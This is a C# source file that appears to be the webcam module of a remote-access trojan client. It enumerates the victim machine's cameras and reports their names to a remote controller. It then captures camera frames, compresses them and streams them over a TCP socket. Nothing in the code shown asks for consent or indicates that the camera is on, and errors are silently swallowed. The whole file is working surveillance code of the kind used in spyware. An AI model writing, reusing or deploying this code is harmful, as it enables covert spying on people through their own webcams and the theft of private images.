using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using Client.StreamLibrary;
using Client.StreamLibrary.UnsafeCodecs;
using MessagePack;

namespace Client.HandlePacket
{
    internal static class HandleCamera
    {
        public static bool IsOk;
        public static VideoCaptureDevice FinalVideo;
        public static IUnsafeCodec unsafeCodec = new UnsafeOptimizedCodec(50);
        public static int Quality = 50;


        public static void CaptureRun(object sender, NewFrameEventArgs e)
        {
            try
            {
                if (Program.TCP_Socket.IsConnected&& IsOk)
                {
                    var image = (Bitmap)e.Frame.Clone();
                    using (MemoryStream stream = new MemoryStream())
                    {
                        BitmapData bmpData = image.LockBits(new Rectangle(0, 0, image.Width, image.Height), ImageLockMode.ReadWrite, image.PixelFormat);
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height),
                            new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "webcam";
                            msgpack.ForcePathObject("Image").SetAsBytes(stream.ToArray());
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                        }
                    }
                    image?.Dispose();
                }
                else
                {
                    CaptureDispose();
                }
            }
            catch (Exception)
            {
                CaptureDispose();
            }
        }

        public static void GetWebcams()
        {
            try
            {
                var deviceInfo = new StringBuilder();
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                    deviceInfo.Append(videoCaptureDevice.Name + "-=>");
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getWebcams";
                msgpack.ForcePathObject("List").AsString = deviceInfo.Length > 0 ? deviceInfo.ToString() : "None-=>";
                new Thread(() => { Program.TCP_Socket.Send(msgpack.Encode2Bytes()); }).Start();
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }

        public static void CaptureDispose()
        {
            try
            {
                IsOk = false;
                FinalVideo.Stop();
                FinalVideo.NewFrame -= CaptureRun;
            }
            catch { }
        }
    }
}